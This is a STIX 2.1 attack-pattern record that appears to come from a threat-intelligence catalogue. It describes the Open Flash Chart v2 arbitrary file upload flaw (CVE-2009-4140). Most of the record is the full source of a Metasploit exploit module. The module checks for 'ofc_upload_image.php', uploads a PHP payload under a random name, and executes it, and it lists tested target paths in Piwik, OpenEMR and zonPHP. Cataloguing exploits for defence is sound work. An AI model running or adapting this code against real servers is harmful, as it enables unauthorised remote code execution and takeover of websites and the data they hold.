{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57e199a5-a6ed-4e4c-8a8d-5471640bf072",
    "created": "2024-08-14T17:13:26.119631Z",
    "modified": "2024-08-14T17:13:26.119635Z",
    "name": "\"Open Flash Chart v2 Arbitrary File Upload\"",
    "description": " This module exploits a file upload vulnerability found in Open Flash Chart version 2. Attackers can abuse the 'ofc_upload_image.php' file in order to upload and execute malicious PHP files.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/open_flash_chart_upload_exec.rb",
            "external_id": "open_flash_chart_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4140"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6787"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6788"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6789"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6790"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6791"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6792"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Open Flash Chart v2 Arbitrary File Upload\",\n      'Description'    => %q{\n          This module exploits a file upload vulnerability found in Open Flash\n        Chart version 2. Attackers can abuse the 'ofc_upload_image.php' file\n        in order to upload and execute malicious PHP files.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Braeden Thomas', # Initial discovery + Piwik PoC\n          'Gjoko Krstic <gjoko[at]zeroscience.mk>', # OpenEMR PoC\n          'Halim Cruzito', # zonPHP PoC\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['BID',   '37314'],\n          ['CVE',   '2009-4140'],\n          ['OSVDB', '59051'],\n          ['EDB',   '10532'],\n          ['WPVDB', '6787'],\n          ['WPVDB', '6788'],\n          ['WPVDB', '6789'],\n          ['WPVDB', '6790'],\n          ['WPVDB', '6791'],\n          ['WPVDB', '6792']\n        ],\n      'Payload'        =>\n        {\n            'Space'       => 8190, # Just a big value, injection on HTTP POST\n            'DisableNops' => true,\n            'BadChars'    => \"\\x00\"\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested on:\n          # * open-flash-chart v2-Lug-Wyrm-Charmer\n          #   set TARGETURI /php-ofc-library/\n          # * open-flash-chart v2-beta-1\n          #   set TARGETURI /php-ofc-library/\n          # * zonPHP v2.25\n          #   set TARGETURI /zonPHPv225/ofc/\n          # * Piwik v0.4.3\n          #   set TARGETURI /piwik/libs/open-flash-chart/php-ofc-library/\n          # * OpenEMR v4.1.1\n          #   set TARGETURI /openemr-4.1.1/library/openflashchart/php-ofc-library/\n          [ 'Generic (PHP Payload)', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-12-14',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to Open Flash Chart', '/php-ofc-library/'])\n        ])\n  end\n\n  #\n  # Check for ofc_upload_image.php\n  #\n  def check\n    print_status(\"Sending check\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"ofc_upload_image.php\"),\n    })\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    elsif res.code.to_i == 404\n      vprint_error(\"No ofc_upload_image.php found\")\n    elsif res and res.code == 200 and res.body =~ /Saving your image to/\n      vprint_status(\"Found ofc_upload_image.php\")\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    # Upload\n    @fname = \"#{rand_text_alphanumeric(rand(10)+6)}.php\"\n    print_status(\"Uploading '#{@fname}' (#{payload.encoded.length} bytes)...\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'ofc_upload_image.php'),\n      'ctype'    => \"\",\n      'vars_get' => { 'name' => \"#{@fname}\" },\n      'data'     => \"<?php #{payload.encoded} ?>\"\n    })\n    if not res\n      fail_with(Failure::Unknown,  \"#{peer} - Request timed out while uploading\")\n    elsif res.code.to_i == 404\n      fail_with(Failure::NotFound, \"#{peer} - No ofc_upload_image.php found\")\n    elsif res.body =~ /can't write file/\n      fail_with(Failure::Unknown,  \"#{peer} - Unable to write '#{@fname}'\")\n    elsif res.body =~ /Saving your image to: (.+)#{@fname}/\n      path = $1\n      register_files_for_cleanup(@fname)\n      print_status(\"Executing '#{path}#{@fname}'\")\n    else\n      fail_with(Failure::NotVulnerable, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    # Execute\n    res = send_request_raw({\n      'uri' => normalize_uri(target_uri.path, path, @fname)\n    })\n    if res and res.code == 404\n      fail_with(Failure::NotFound, \"#{peer} - Not found: #{@fname}\")\n    end\n\n  end\nend\n\n#\n# Source\n#\n=begin ofc_upload_image.php\n20-// default path for the image to be stored //\n21-$default_path = '../tmp-upload-images/';\n\n23-if (!file_exists($default_path)) mkdir($default_path, 0777, true);\n\n25-// full path to the saved image including filename //\n26-$destination = $default_path . basename( $_GET[ 'name' ] );\n\n28-echo 'Saving your image to: '. $destination;\n\n39-$jfh = fopen($destination, 'w') or die(\"can't open file\");\n40-fwrite($jfh, $HTTP_RAW_POST_DATA);\n41-fclose($jfh);\n=end\n",
    "x_mitre_disclosure_date": "2009-12-14",
    "x_mitre_platforms": [
        "php'"
    ]
}